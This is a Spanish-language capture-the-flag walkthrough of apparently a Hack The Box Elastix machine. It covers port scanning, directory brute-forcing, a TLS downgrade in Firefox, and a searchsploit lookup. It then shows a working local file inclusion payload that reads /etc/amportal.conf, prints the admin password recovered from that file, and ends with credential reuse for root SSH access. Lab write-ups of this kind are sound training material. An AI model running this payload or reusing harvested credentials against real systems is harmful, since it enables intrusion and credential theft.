### NMAP
```
nmap -p- -Pn -sS -sV 10.129.74.0
```
![](Pasted%20image%2020260118142054.png)
Probamos a acceder a todos los puertos y el único que muestra información es el 443
```
http://10.129.76.175:443/
```
![](Pasted%20image%2020260118142921.png)

### GOBUSTER
```
gobuster dir -u http://10.129.76.175 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```
![](Pasted%20image%2020260118150504.png)
Error: the server returns a status code that matches the provided options for non existing urls. http://10.129.76.175/4a94944f-e9ae-49bd-a52a-43d77d11bbc8 => 302 (Length: 320). To continue please exclude the status code or the length

Modificamos el comando para excluir la salida con length = 320
```
gobuster dir -u https://10.129.76.175:443/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 320
```
![](Pasted%20image%2020260118150549.png)
Error: error on running gobuster: unable to connect to https://10.129.76.175:443/: invalid certificate: x509: certificate has expired or is not yet valid: current time 2026-01-18T08:05:39-06:00 is after 2018-04-07T08:22:08Z

Modificamos nuevamente el comando para ignorar el certificado y evitar que el comando no se ejecute

```
gobuster dir -u https://10.129.76.175:443/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --exclude-length 320 -k
```
![](Pasted%20image%2020260118152009.png)
Sin embargo seguimos sin poder acceder a los recursos debido al problema del certificado
![](Pasted%20image%2020260118155618.png)

### CURL

Comparamos la versión de la aplicación y la del navegador
```
#curl 10.129.76.175:443 -vvv
```
![](Pasted%20image%2020260118160331.png)
Observamos que se recibe una respuesta con una versión menor a la soportada por defecto en el navegador

Realizando una búsqueda observamos que por defecto firefox utiliza las versiones 1.2 y 1.3, pero es posible hacer que el navegador interprete un TLS antiguo
![](Pasted%20image%2020260118160616.png)
Accedemos a about:config
Buscamos la opción security.tls.version.min y la cambiamos de 3 a 1
![](Pasted%20image%2020260118160642.png)

### WEB

Confirmamos que ahora es posible acceder a la web
![](Pasted%20image%2020260118160807.png)
No disponemos de credenciales por lo que procedemos a buscar exploits para conseguir acceso
Analizamos el código de la web y observamos un comentario
```
<!--<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">-->
```


### SEARCHSPLOIT
```
#searchsploit elastix
```
Elastix - 'page' Cross-Site Scripting                  | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilitie | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerab | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion       | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                      | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                     | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py

Probamos a ejecutar el Local File Inclusion
```
locate 37637
cp /usr/share/exploitdb/exploits/php/webapps/37637
 Downloads/
cd Downloads/
```
![](Pasted%20image%2020260118162909.png)
Analizamos el exploit y observamos como obtener el LFI
```
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```
Añadimos este payload a la URL y obtenemos acceso a una web con las credenciales de acceso al servidor
```
view-source:https://10.129.76.175//vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```
![](Pasted%20image%2020260118163123.png)
AMPMGRUSER=admin
AMPMGRPASS=jEhdIekWmdjE

También se observa que aparece mencionado el usuario root sin contraseña
![](Pasted%20image%2020260118163520.png)
asterisk localhost=(root)NOPASSWD: /bin/tar

Obtenemos acceso a la web aunque no parece ser de utilidad
```
https://10.129.76.175/index.php?menu=system
```
![](Pasted%20image%2020260118164152.png)

Probamos a conectarnos por ssh
```
ssh admin@10.129.76.175
```
Unable to negotiate with 10.129.76.175 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1

Para solucionar este error hay que modificar el [comando](https://serverfault.com/questions/1047019/ssh-no-matching-key-exchange-method-found-when-kexalgorithm-is-listed-as-avai#:~:text=ssh%20%2DoKexAlgorithms%3D%2Bdiffie%2Dhellman%2Dgroup1%2Dsha1%20%2Dc%203des%2Dcbc%20user%40remotehost)
```
#ssh -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group14-sha1 -oPubkeyAcceptedAlgorithms=+ssh-rsa admin@10.129.76.175
```
![](Pasted%20image%2020260118165147.png)
Parece que las credenciales con las que hemos conseguido iniciar sesión en elastix no funcionan, se comprueba si con root funciona
```
ssh -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group14-sha1 -oPubkeyAcceptedAlgorithms=+ssh-rsa root@10.129.76.175
```
![](Pasted%20image%2020260118165345.png)
Parece ser que el servidor abusa de la reutilización de credenciales para diferentes acceso por lo que conseguimos acceso al mismo.
